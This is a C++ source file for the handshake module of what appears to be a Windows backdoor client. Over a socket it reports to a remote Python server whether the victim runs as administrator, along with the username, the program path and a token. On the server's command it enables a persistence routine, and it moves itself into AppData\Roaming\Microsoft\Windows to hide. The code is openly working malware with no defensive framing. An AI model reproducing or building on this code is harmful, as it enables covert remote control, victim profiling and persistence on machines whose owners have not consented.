#include <iostream>
#include <windows.h>

#include <lmcons.h> // GetUserName UNLEN
#include <direct.h> // _getcwd
//#include <stdlib.h>

#include "../inc/HandShake.h"
#include "../inc/ModShell.h"
#include "../inc/Persistence.h"
#include "../inc/common.h"
#include "../inc/other.h"

using namespace  std;

HandShake::HandShake()
{
    cout << "Constructor called handsake:\n" << endl;
    a_name_user = setNameUser();
    a_is_admin = setIsAdmin();
    a_current_directory = setCurrentDirectory();
    a_name_prog = NAME_PROG;
    a_location_prog = setLocationProg();
    cout << "LOCATION PROG: " << endl;
    a_token = TOKEN;
    cout << "TOKEN: " << a_token << endl;

}
void HandShake::setSock(int sock)
{
    a_sock = sock;
}
int HandShake::startHandShake()
{
    // ' SPLIT ' for split data in python server.py script
    string is_admin;
    
    cout << "\n\nSOCKET STARTHAND: " << a_sock << endl;
    if(a_is_admin)
    {
        //If admin
        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
        cout << "is admin in startHandShake: " << is_admin << endl;
    }
    else
    {
        //if not admin
        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
        cout << "is admin in startHandShake: " << is_admin << endl;
    }
    //cout << a_location_prog << endl;
    //cout << a_name_user << endl;
    string path_prog = "MOD_HANDSHAKE_PATH_PROG" SPLIT + a_location_prog;
    string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
    string token = "MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
    
    sendUltraSafe(a_sock, is_admin);
    sendUltraSafe(a_sock, path_prog);
    sendUltraSafe(a_sock, name_user);
    sendUltraSafe(a_sock, token);
    sendUltraSafe(a_sock, "\r\n");


//010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
//010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101

    cout << "\n\n[+] second part of handshake  goooo !!" << endl;
    //Gets all the parameters that the server sends during the handshake.
    string result;
    int i_recv = 0;
    char buffer[BUFFER_LEN];
    bool auto_persi = false; //default
    int index=0;


    while(true)
    {   
        if(i_recv > 14)
        {
            //avoid errors if the function runs in a loop
            cout << "Must itterator !" << endl;
            break;
        }

        string result = recvUltraSafe(a_sock);
        
        index =  result.find(SPLIT);
        cout << "INDEX: " << index << endl;
        cout << "RESULT: " << result << endl;
    
        if(index != string::npos)
        {
            cout <<"--->"<< result << endl;
            cout << "LEN -->" << result.length() << endl;
            cout << result.substr((index+strlen(SPLIT)), result.length()) << endl;
            cout << result.substr(0, index)  << "<-----" <<endl;
            cout << "INDEX FIND: " << index << endl;
            
            if(result.substr(0,index) == "MOD_HANDSHAKE_AUTO_PERSISTENCE")
            {
                //All informations in MOD_HANDSHAKE_AUTO_PERSISTENCE
                cout << "MOD_HANDSHAKE_AUTO_PERSISTENCE ok" << endl;
                if(result.substr((index+strlen(SPLIT)),result.length())== "True")
                {
                    cout << "IS: " << result.substr((index+strlen(SPLIT))) << endl;

                    Persistence(a_is_admin,a_location_prog).main();
                }
                
                else if (result.substr((index+strlen(SPLIT)),result.length())== "False")
                {
                    cout << "IS: " << result.substr((index+strlen(SPLIT)),result.length()) << endl;
                }
                else
                {
                    cout << "Error  in recv MOD_HANDSHAKE_AUTO_PERSISTENCE" << endl;
                }
            }    

            result.erase();        
        }
        else if(result == "\r\n")
        {
            cout << "end handshake" << endl;
            break;
        }
        else // Not index find 
        {
            cout << "NOT FIND INDEX" << endl;
        }
        ++i_recv;
    }
    
    return 0;
}

bool HandShake::setIsAdmin()
{
    string result;
    cout << "call getamdin" << endl;
    ModShell().exec("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"",result);
    if(result.substr(0,4) == "True") //remove ruturn line.
    {
        //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return true;
    }
    else
    {
        //2 cout << "NOT ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return false;
    }
}

string HandShake::setNameUser()
{
    cout << "call genameuser" << endl;
    TCHAR user[UNLEN+1];
    DWORD len_user = UNLEN+1;
    if(GetUserName(user,&len_user) == 0)
    {
        //if error
        return "Unknown";
    }
    else
    {
        string result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
        //2 cout <<"name user: " <<result << endl;
        return result.substr(0,result.length()-1);    
    }
    
}

string HandShake::setCurrentDirectory()
{
    cout << "call getcyrrentdirectory" << endl;
    char buffer[PATHLEN];
    _getcwd(buffer,PATHLEN);
    if(buffer == NULL)
    {
        return "Unknown";
    }
    else
    {
        return (string) buffer;
    }
}

string HandShake::setLocationProg()
{
    //if admin
    string result;

    if(AUTO_MOVE)
    {
        if(a_is_admin)
        {
            result =   PATH_ADMIN "\\" + a_name_prog;
        }
        else
        {
            string path_CONST=PATH_NOT_ADMIN;
            int index = 0;
            if(path_CONST.find("$USER") != string::npos)
            {   
                //If $user in string, replace by a_name_user (username of machine) 
                index = path_CONST.find("$USER");
                //cout << "$USER DETECT: "<<index<< endl;
                path_CONST.replace(index,a_name_user.length(),a_name_user);
                            //de index, 5 char,  remplace par a_name_user
                cout << path_CONST << endl;;  
                return path_CONST + "\\" +a_name_prog;
            }
            else
            {
                result = "C:\\Users\\"+ a_name_user+"\\AppData\\Roaming\\Microsoft\\Windows\\" + a_name_prog;
            }
        }
    }
    else
    {
        char buffer[MAX_PATH];
        GetModuleFileNameA(NULL, buffer, sizeof(buffer));
        result = buffer;
    }
    return result;
}
bool HandShake::getIsAdmin()
{
    return a_is_admin; //ghetter
}

string HandShake::getPathProg()
{
    //cout << "GetPathProg: " << a_location_prog << endl;
    return a_location_prog;
}

string HandShake::getNameUser()
{
    return a_name_user;
}

void HandShake::moveProg()
{
   // Deplace le programme en fonction des privilèges de l'utilisateur.
    cout << "name prog : " << a_name_prog << endl;
    cout << "Location prog: " << a_location_prog << endl;
    if(a_is_admin)
    {   
        if((rename(a_name_prog.c_str(), (a_location_prog).c_str())!=0))
        {   
            perror("Error in move prog ");
            a_location_prog = a_current_directory + "\\" + a_name_prog; //if error
        }
    }
    else
    {
        //C:\Users\cisco\AppData\Roaming\Microsoft
        //if not adminW
        if((rename(a_name_prog.c_str(),(a_location_prog).c_str()))!= 0)
        {
            perror("Error in move prog ");  
            a_location_prog = a_current_directory + "\\" + a_name_prog; 
        }
    }
}
